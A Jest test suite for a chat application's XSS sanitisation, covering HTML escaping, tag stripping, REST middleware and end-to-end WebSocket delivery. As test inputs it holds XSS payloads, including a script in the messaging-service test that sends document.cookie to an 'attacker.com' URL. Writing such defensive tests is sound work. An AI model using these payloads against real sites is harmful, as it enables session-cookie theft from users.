const { describe, it, expect, beforeAll, afterAll } = require('@jest/globals');
const http = require('http');
const request = require('supertest');
const ioClient = require('socket.io-client');
const app = require('../src/app');
const { initializeSocket } = require('../src/sockets');
const { escapeHtml, sanitizeMessage, stripDangerousTags, sanitizeDeep } = require('../src/utils/sanitizer');
const messagingService = require('../src/services/messagingService');
const { generateToken } = require('../src/services/authService');

describe('Security Requirement: XSS Sanitisation of Message Content (Issue #9 - CHAT-SR-004, TC-Sec-04)', () => {
  let server;
  let ioInstance;
  let serverPort;

  beforeAll(async () => {
    server = http.createServer(app);
    const result = initializeSocket(server);
    ioInstance = result.io || result;

    await new Promise((resolve) => {
      server.listen(0, () => {
        serverPort = server.address().port;
        resolve();
      });
    });
  });

  afterAll(async () => {
    if (ioInstance) {
      await new Promise((resolve) => ioInstance.close(resolve));
    }
    await new Promise((resolve) => server.close(resolve));
  });

  describe('Unit Tests: Sanitizer Utilities', () => {
    it('escapeHtml should convert dangerous HTML characters into inert entities', () => {
      const malicious = '<script>alert("XSS")</script>';
      const sanitized = escapeHtml(malicious);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
      expect(sanitized).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
    });

    it('escapeHtml should escape quotes, apostrophes, ampersands, and slashes', () => {
      const input = `<img src="x" onerror='alert(1)' /> & \`test\``;
      const sanitized = escapeHtml(input);

      expect(sanitized).toContain('&quot;x&quot;');
      expect(sanitized).toContain('&#x27;alert(1)&#x27;');
      expect(sanitized).toContain('&amp;');
      expect(sanitized).toContain('&#96;test&#96;');
      expect(sanitized).not.toContain('<img');
    });

    it('stripDangerousTags should remove script tags and inline javascript event handlers', () => {
      const input = '<p>Hello</p><script>alert("hack")</script><a href="javascript:void(0)" onclick="steal()">Click</a>';
      const stripped = stripDangerousTags(input);

      expect(stripped).not.toContain('<script>');
      expect(stripped).not.toContain('alert("hack")');
      expect(stripped).not.toContain('javascript:');
      expect(stripped).not.toContain('onclick=');
    });

    it('sanitizeMessage should trim and render arbitrary HTML payloads inert', () => {
      const payload = '   <iframe src="evil.com"></iframe>   ';
      const result = sanitizeMessage(payload);

      expect(result).toBe('&lt;iframe src=&quot;evil.com&quot;&gt;&lt;&#x2F;iframe&gt;');
    });

    it('sanitizeDeep should recursively sanitize object and array properties while preserving types', () => {
      const payload = {
        name: '<b>Alice</b>',
        messages: ['<script>xss()</script>', 'Hello world'],
        nested: {
          bio: '<img src=x onerror=alert(1)>',
          count: 42,
        },
      };

      const sanitized = sanitizeDeep(payload);
      expect(sanitized.name).toBe('&lt;b&gt;Alice&lt;&#x2F;b&gt;');
      expect(sanitized.messages[0]).toBe('&lt;script&gt;xss()&lt;&#x2F;script&gt;');
      expect(sanitized.messages[1]).toBe('Hello world');
      expect(sanitized.nested.bio).toBe('&lt;img src=x onerror=alert(1)&gt;');
      expect(sanitized.nested.count).toBe(42);
    });
  });

  describe('Integration Tests: Messaging Service Sanitization', () => {
    it('messagingService.processMessage should sanitize message content before returning', async () => {
      const maliciousText = '<script>document.location="http://attacker.com/steal?c="+document.cookie</script>';
      const message = await messagingService.processMessage({
        roomId: 'room_sec_1',
        text: maliciousText,
        senderId: 'user_attacker',
        clientMsgId: 'msg_uuid_1',
      });

      expect(message.text).not.toContain('<script>');
      expect(message.text).not.toContain('</script>');
      expect(message.text).toContain('&lt;script&gt;');
      expect(message.text).toContain('&lt;&#x2F;script&gt;');
    });
  });

  describe('Integration Tests: Express REST Middleware (xssSanitizerMiddleware)', () => {
    it('should sanitize request body fields against script injection on REST endpoints', async () => {
      const res = await request(app)
        .post('/api/auth/register')
        .send({
          username: '<script>alert("admin")</script>',
          email: 'test@example.com',
          password: 'Password123!',
        });

      // The controller or service receives sanitized username
      if (res.body?.user) {
        expect(res.body.user.username).not.toContain('<script>');
      }
    });
  });

  describe('TC-Sec-04: End-to-End WebSocket XSS Sanitisation (AC-CHAT-SR-004)', () => {
    let clientA;
    let clientB;

    beforeAll(async () => {
      const tokenA = generateToken({
        id: 'user_sender',
        email: 'sender@example.com',
        username: 'sender',
      }).token;

      const tokenB = generateToken({
        id: 'user_recipient',
        email: 'recipient@example.com',
        username: 'recipient',
      }).token;

      clientA = ioClient(`http://localhost:${serverPort}`, {
        auth: { token: tokenA },
        transports: ['websocket'],
      });

      clientB = ioClient(`http://localhost:${serverPort}`, {
        auth: { token: tokenB },
        transports: ['websocket'],
      });

      await Promise.all([
        new Promise((resolve) => clientA.on('connection:ack', resolve)),
        new Promise((resolve) => clientB.on('connection:ack', resolve)),
      ]);
    });

    afterAll(() => {
      if (clientA?.connected) clientA.disconnect();
      if (clientB?.connected) clientB.disconnect();
    });

    it('should receive message with rendered inert text and no executable <script> tags', async () => {
      const xssPayload = '<script>window.__injected = true;</script><img src="invalid" onerror="alert(document.cookie)">';

      await new Promise((resolve) => {
        clientB.on('message:receive', (receivedMsg) => {
          // Verification for TC-Sec-04 / AC-CHAT-SR-004:
          // The payload must render as inert text, not executable script
          expect(receivedMsg.text).not.toContain('<script>');
          expect(receivedMsg.text).not.toContain('</script>');
          expect(receivedMsg.text).toContain('&lt;script&gt;');
          expect(receivedMsg.text).toContain('&lt;&#x2F;script&gt;');
          expect(receivedMsg.text).toContain('&lt;img');
          expect(receivedMsg.text).toContain('&quot;alert(document.cookie)&quot;');
          resolve();
        });

        clientA.emit('message:send', {
          recipientId: 'user_recipient',
          text: xssPayload,
          clientMsgId: 'msg_sec_test_04',
        });
      });
    });
  });
});
